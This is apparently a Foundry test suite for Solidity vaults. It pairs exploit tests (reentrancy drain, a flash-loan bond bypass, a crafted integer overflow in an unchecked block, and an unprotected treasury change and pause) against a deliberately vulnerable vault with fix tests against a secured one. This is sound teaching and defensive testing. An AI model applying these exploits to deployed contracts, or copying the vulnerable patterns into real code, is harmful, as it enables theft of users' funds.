// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VulnerableVault} from "./VulnerableVault.sol";
import {SecureVault} from "./SecureVault.sol";
import {
    ReentrancyAttacker,
    ReentrancyAttackerSecure,
    FlashLoanAttacker,
    MockLendingPool
} from "./Attacker.sol";

// ═══════════════════════════════════════════════════════════════════════════════
// Section 1: Reentrancy Exploit & Fix
// ═══════════════════════════════════════════════════════════════════════════════

contract ReentrancyExploitTest is Test {
    VulnerableVault vault;
    ReentrancyAttacker attacker;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    bytes32 constant ALICE_ID = keccak256("alice-escrow");
    bytes32 constant ATTACKER_ID = keccak256("attacker-escrow");

    function setUp() public {
        vault = new VulnerableVault(makeAddr("treasury"));

        // Alice deposits 5 ETH
        vm.deal(alice, 5 ether);
        vm.prank(alice);
        vault.deposit{value: 5 ether}(ALICE_ID);

        // Attacker deploys their contract
        attacker = new ReentrancyAttacker(address(vault));
    }

    /// @notice Exploit: Attacker deposits 1 ETH, re-enters withdraw() to drain 6 ETH total.
    function test_exploit_reentrancy() public {
        // Vault holds 5 ETH (Alice's deposit)
        assertEq(address(vault).balance, 5 ether);

        // Attacker deposits 1 ETH and triggers reentrant withdrawal
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}(ATTACKER_ID, 5);

        // Vault is drained — attacker stole Alice's funds
        assertEq(address(vault).balance, 0);
        assertEq(address(attacker).balance, 6 ether, "Attacker should have all 6 ETH");

        console.log("[EXPLOIT] Reentrancy: Vault drained from 6 ETH to 0");
        console.log("[EXPLOIT] Attacker profit: 5 ETH (deposited 1, got 6)");
    }
}

contract ReentrancyFixTest is Test {
    SecureVault vault;
    ReentrancyAttackerSecure attacker;

    address alice = makeAddr("alice");
    bytes32 constant ALICE_ID = keccak256("alice-escrow");
    bytes32 constant ATTACKER_ID = keccak256("attacker-escrow");

    function setUp() public {
        vault = new SecureVault(makeAddr("treasury"));

        vm.deal(alice, 5 ether);
        vm.prank(alice);
        vault.deposit{value: 5 ether}(ALICE_ID);

        attacker = new ReentrancyAttackerSecure(address(vault));
    }

    /// @notice Fix: SecureVault uses CEI + nonReentrant. The same attack reverts.
    /// The re-entrant call in receive() reverts due to nonReentrant, which
    /// propagates up and causes the entire withdrawal + deposit to roll back.
    function test_fix_reentrancy() public {
        assertEq(address(vault).balance, 5 ether);

        vm.deal(address(this), 1 ether);

        // The attack reverts because:
        // 1. nonReentrant: re-entrant withdraw() call in receive() reverts
        // 2. The revert propagates through the ETH transfer, failing the first withdraw()
        // 3. The entire attack() transaction reverts, rolling back the deposit too
        vm.expectRevert("Transfer failed");
        attacker.attack{value: 1 ether}(ATTACKER_ID);

        // Alice's 5 ETH is completely safe — the attack was fully rolled back
        assertEq(address(vault).balance, 5 ether, "Alice's funds should be safe");
        assertEq(address(attacker).balance, 0, "Attacker gained nothing");

        console.log("[FIX] Reentrancy: Attack fully reverted, Alice's 5 ETH safe");
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Section 2: Flash Loan Exploit & Fix
// ═══════════════════════════════════════════════════════════════════════════════

contract FlashLoanExploitTest is Test {
    VulnerableVault vault;
    MockLendingPool pool;
    FlashLoanAttacker attacker;

    bytes32 constant SOLVER_ID = keccak256("flash-solver");

    function setUp() public {
        vault = new VulnerableVault(makeAddr("treasury"));
        pool = new MockLendingPool();

        // Fund the lending pool with 10 ETH
        vm.deal(address(pool), 10 ether);

        attacker = new FlashLoanAttacker(address(vault), address(pool));
    }

    /// @notice Exploit: Attacker borrows 1 ETH via flash loan, passes bond check, repays.
    /// Ends up registered as a solver with zero actual bond.
    function test_exploit_flashLoan() public {
        // Attacker has no ETH
        assertEq(address(attacker).balance, 0);
        assertFalse(vault.registeredSolvers(SOLVER_ID));

        // Execute flash loan attack
        attacker.attack(SOLVER_ID);

        // Attacker is now a registered solver — with zero bond!
        assertTrue(vault.registeredSolvers(SOLVER_ID), "Solver should be registered");
        assertEq(address(attacker).balance, 0, "Attacker spent nothing");
        assertEq(address(pool).balance, 10 ether, "Pool was fully repaid");

        console.log("[EXPLOIT] Flash Loan: Solver registered with 0 real bond");
        console.log("[EXPLOIT] Pool balance unchanged - loan was atomically repaid");
    }
}

contract FlashLoanFixTest is Test {
    SecureVault vault;

    address solver = makeAddr("solver");
    bytes32 constant SOLVER_ID = keccak256("secure-solver");

    function setUp() public {
        vault = new SecureVault(makeAddr("treasury"));
    }

    /// @notice Fix: SecureVault requires msg.value >= MIN_BOND (internal accounting).
    /// Flash loans don't help because the bond must be deposited into the contract.
    function test_fix_flashLoan() public {
        // Cannot register without sending ETH
        vm.prank(solver);
        vm.expectRevert("Insufficient bond");
        vault.registerSolver(SOLVER_ID);

        // Must send actual ETH as bond
        vm.deal(solver, 2 ether);
        vm.prank(solver);
        vault.registerSolver{value: 1 ether}(SOLVER_ID);

        assertTrue(vault.registeredSolvers(SOLVER_ID));
        assertEq(vault.depositedBonds(SOLVER_ID), 1 ether, "Bond tracked internally");

        console.log("[FIX] Flash Loan: Registration requires deposited bond (msg.value)");
        console.log("[FIX] Bond tracked in contract state, not balance snapshot");
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Section 3: Integer Overflow Exploit & Fix
// ═══════════════════════════════════════════════════════════════════════════════

contract OverflowExploitTest is Test {
    VulnerableVault vault;
    address solver = makeAddr("solver");

    function setUp() public {
        vault = new VulnerableVault(makeAddr("treasury"));

        // Fund the reward pool with 5 ETH
        vm.deal(address(this), 5 ether);
        vault.fundRewardPool{value: 5 ether}();
    }

    /// @notice Exploit: Carefully chosen `amount` causes overflow in unchecked block,
    /// producing a small `reward` that passes the pool check, then drains funds.
    function test_exploit_overflow() public {
        // REWARD_MULTIPLIER = 1e18
        // We need: amount * 1e18 to overflow and produce a value <= 5 ETH
        //
        // type(uint256).max = 2^256 - 1
        // We want: amount * 1e18 = 2^256 + target (wraps to target)
        // amount = (2^256 + target) / 1e18
        //
        // Let target = 5 ether = 5e18
        // amount = (2^256 + 5e18) / 1e18
        uint256 amount = (type(uint256).max / 1e18) + 1;
        // Verify this actually overflows to <= target in unchecked
        uint256 overflowed;
        unchecked {
            overflowed = amount * 1e18;
        }

        // The overflow produces a value that's small enough to pass the pool check
        assertTrue(overflowed <= vault.rewardPool(), "Overflow should produce claimable amount");

        // Claim with the overflowed amount
        vm.deal(solver, 0);
        vm.prank(solver);
        vault.claimReward(amount);

        console.log("[EXPLOIT] Overflow: Claimed %d wei from pool", overflowed);
        console.log("[EXPLOIT] Input amount was astronomically large but overflowed to small reward");
    }
}

contract OverflowFixTest is Test {
    SecureVault vault;
    address solver = makeAddr("solver");

    function setUp() public {
        vault = new SecureVault(makeAddr("treasury"));

        vm.deal(address(this), 5 ether);
        vault.fundRewardPool{value: 5 ether}();
    }

    /// @notice Fix: SecureVault uses checked arithmetic (Solidity 0.8 default).
    /// The same overflow attempt reverts with arithmetic underflow/overflow.
    function test_fix_overflow() public {
        uint256 amount = (type(uint256).max / 1e18) + 1;

        vm.prank(solver);
        vm.expectRevert(); // Arithmetic overflow
        vault.claimReward(amount);

        // Pool is untouched
        assertEq(vault.rewardPool(), 5 ether, "Reward pool should be unchanged");

        console.log("[FIX] Overflow: Checked arithmetic reverts on overflow");
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Section 4: Access Control Exploit & Fix
// ═══════════════════════════════════════════════════════════════════════════════

contract AccessControlExploitTest is Test {
    VulnerableVault vault;

    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address legitimateTreasury = makeAddr("treasury");
    address attackerTreasury = makeAddr("attacker-treasury");

    function setUp() public {
        vm.prank(owner);
        vault = new VulnerableVault(legitimateTreasury);

        // Fund forfeited bonds
        vm.deal(address(this), 3 ether);
        vault.addForfeitedBonds{value: 3 ether}();
    }

    /// @notice Exploit: Anyone can call setTreasury(), redirecting sweepBonds() funds.
    function test_exploit_accessControl() public {
        // Verify initial treasury
        assertEq(vault.treasury(), legitimateTreasury);

        // Attacker hijacks treasury
        vm.prank(attacker);
        vault.setTreasury(attackerTreasury);

        assertEq(vault.treasury(), attackerTreasury, "Treasury hijacked");

        // Attacker sweeps forfeited bonds to their own address
        vm.prank(attacker);
        vault.sweepBonds();

        assertEq(attackerTreasury.balance, 3 ether, "Attacker stole all forfeited bonds");

        console.log("[EXPLOIT] Access Control: Treasury hijacked, 3 ETH stolen");
    }

    /// @notice Exploit: Anyone can pause the contract, causing a DoS.
    function test_exploit_accessControl_pause() public {
        vm.prank(attacker);
        vault.pause();

        assertTrue(vault.paused(), "Contract paused by attacker");

        // Legitimate users can no longer deposit
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        vm.expectRevert("Paused");
        vault.deposit{value: 1 ether}(keccak256("test"));

        console.log("[EXPLOIT] Access Control: Attacker paused entire contract (DoS)");
    }
}

contract AccessControlFixTest is Test {
    SecureVault vault;

    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address legitimateTreasury = makeAddr("treasury");
    address attackerTreasury = makeAddr("attacker-treasury");

    function setUp() public {
        vm.prank(owner);
        vault = new SecureVault(legitimateTreasury);

        vm.deal(address(this), 3 ether);
        vault.addForfeitedBonds{value: 3 ether}();
    }

    /// @notice Fix: onlyOwner modifier blocks unauthorized callers.
    function test_fix_accessControl() public {
        // Attacker cannot change treasury
        vm.prank(attacker);
        vm.expectRevert(SecureVault.NotOwner.selector);
        vault.setTreasury(attackerTreasury);

        // Treasury unchanged
        assertEq(vault.treasury(), legitimateTreasury);

        // Only owner can change treasury
        vm.prank(owner);
        vault.setTreasury(makeAddr("new-treasury"));
        assertEq(vault.treasury(), makeAddr("new-treasury"));

        console.log("[FIX] Access Control: onlyOwner blocks unauthorized treasury change");
    }

    /// @notice Fix: onlyOwner modifier prevents unauthorized pause.
    function test_fix_accessControl_pause() public {
        vm.prank(attacker);
        vm.expectRevert(SecureVault.NotOwner.selector);
        vault.pause();

        assertFalse(vault.paused(), "Contract should not be paused");

        // Owner can pause
        vm.prank(owner);
        vault.pause();
        assertTrue(vault.paused());

        console.log("[FIX] Access Control: onlyOwner blocks unauthorized pause");
    }

    /// @notice Fix: onlyOwner modifier prevents unauthorized bond sweep.
    function test_fix_accessControl_sweep() public {
        vm.prank(attacker);
        vm.expectRevert(SecureVault.NotOwner.selector);
        vault.sweepBonds();

        // Owner can sweep
        vm.prank(owner);
        vault.sweepBonds();
        assertEq(legitimateTreasury.balance, 3 ether);

        console.log("[FIX] Access Control: onlyOwner blocks unauthorized sweep");
    }
}
